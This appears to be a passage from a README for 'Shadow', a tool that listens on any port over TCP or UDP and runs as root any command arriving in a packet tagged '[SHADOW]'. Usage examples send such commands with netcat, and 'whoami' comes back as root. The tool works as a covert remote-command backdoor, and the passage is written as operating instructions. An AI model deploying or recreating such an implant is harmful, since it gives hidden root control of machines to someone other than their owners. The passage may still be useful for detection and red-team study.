### Success Example
In this example we see the basic functionality of shadow.
On some server:
```bash
dtbm@dev:~$ echo -n "[SHADOW]echo hello" | nc -4u -w1 100.64.12.61 900
```
On some client already running shadow binary:
```bash
dtbm@client:~$ sudo ./Shadow
  SOURCE IP         DEST IP           DATA
> 100.64.12.237     100.64.12.61      echo hello
< hello
```

### Fail Example
In this example, we can see that the commands are run as root, and it is fault tolerant.
From some server:
```bash
dtbm@dev:~$ echo -n "[SHADOW]whoami" | nc -4u -w1 100.64.12.61 900
dtbm@dev:~$ echo -n "[SHADOW]whocami" | nc -4u -w1 100.64.12.61 900
dtbm@dev:~$ echo -n "[SHADOW]whoami" | nc -4u -w1 100.64.12.61 900
```
On some client with shadow binary running already:
```bash
dtbm@stack:~/Shadow$ sudo ./Shadow
  SOURCE IP         DEST IP           DATA
> 100.64.12.237     100.64.12.61      whoami
< root

> 100.64.12.237     100.64.12.61      whocami
< ERROR: exit status 127
> 100.64.12.237     100.64.12.61      whoami
< root
``` 

### TCP and UDP example
In this example, we can see the protocol and port agnostic feature of Shadow.

Client output:
```bash
  SOURCE IP      DEST IP        PROTO    DATA
> 100.64.12.237  100.64.12.61   UDP      echo UDP
! echo UDP
< UDP

> 100.64.12.237  100.64.12.61   TCP      echo TCP
! echo TCP
< TCP
```

Server input:
```bash
dtbm@dev:~$ echo -n "[SHADOW]echo UDP" | sudo nc -4u -w1 100.64.12.61 10000
dtbm@dev:~$ sudo python3 test.py
```
> [!Note]
> Example test.py can be found in the examples directory at [examples/test.py]